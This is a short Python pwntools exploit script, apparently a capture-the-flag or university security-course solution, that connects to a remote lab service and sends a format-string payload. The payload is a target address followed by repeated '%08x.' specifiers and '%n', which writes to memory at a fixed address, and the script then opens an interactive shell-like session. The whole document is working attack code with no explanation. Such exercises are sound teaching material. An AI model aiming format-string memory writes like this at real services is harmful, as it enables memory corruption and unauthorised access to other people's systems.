from pwn import *

targetAddr = 0x804a040

# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10052)

P.sendline(p32(targetAddr) + b"%08x."*6 + b"%n")
P.interactive()